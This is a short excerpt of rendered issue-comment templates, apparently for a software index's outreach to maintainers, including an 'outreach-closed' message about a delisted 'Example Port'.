> Everything checks out again, thank you! Closing this.

### `outreach-closed` (rendered from the template)

> Thanks again for your work on Example Port. Its listing is no longer on the index, so this issue is closing. There's nothing you need to do here.
